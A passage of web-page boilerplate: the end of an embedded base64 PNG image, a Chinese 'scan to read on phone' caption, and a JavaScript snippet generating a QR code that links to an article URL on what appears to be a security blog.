SE05Q4Izn6htQqlH0X2Q/StOAgNWP9A9XX65/Vi+20v9CnBc7mP7VeK1xmtZax06Htbh+C8FsLMiVdAaNB/SBM/hs8C537oOkQ+9oLggVE6XHv/jOt7yOF1vUdYA3nPvR/u2gaSH5sr+WHHmwBMb4mhcxD5zTp95L1HEaIOGKVtnWudb0L6ZF4IbOdM8rYGMtX+0WpHDgv1cwzSbmmPEGj7QeRtILuqtXjbDUwDgZgU1Hh2UoiaM0/W9CpxQNRCx+xVbm9G8WPA3AOCG71X1hC11b4QGsyYe7sWus9c9k0DyeLKX38DayCvv/PTHX99IH4sKzw92U2EeLxv6fYBsYaOmzB8ynsN0u6baPY5tx/6HqNmT0Z7hOaVOyoOYg9rwl8fiDZZsb+Bs9VbBwLxCgHaGf2KqrCZUgLsXvWwXyfrlua+sPcCm0efKp94h3WvgXaOioPQrWV0L+FbB5IPtfK4gTWQuIeP+TwNRI/NWZydvKqzH+KRBUy1n4BzXRNTAmxfDh75UklLIWob8SDxHg9s23mA0lb1qLiqeBpIZVrc626gDQRoU4fH+dUjQvTyK0ToWggNzlE1Cug+9xB/JezPWNVZh76XfdaEFSdeAVGr3AEzV/VoA3HhwvfewBrIe+9/2v1/AAAA///beZUTAAAABklEQVQDAPK8rIZQIGfGAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/51mis-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 